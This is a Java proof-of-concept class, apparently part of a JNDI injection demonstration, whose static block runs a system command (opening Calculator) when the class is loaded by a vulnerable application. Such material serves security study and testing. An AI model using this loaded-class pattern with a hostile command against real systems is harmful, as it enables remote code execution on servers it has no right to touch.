package org.lain.poc.jndi;


import java.io.IOException;

/**
 * @author: ZH3FENG
 * @Date: 上午10:18 2017/12/12
 * @Modified By:
 * @Description: 模拟一个恶意类，静态代码块执行命令
 */
public class EvilObject {


    public EvilObject(){
        System.out.println("Hi!");
    }
    /**
     * 简单的命令执行
     */
    static {
        try {
            Runtime.getRuntime().exec("open /Applications/Calculator.app");
        }catch (IOException e){
            //ignore
        }
    }
}
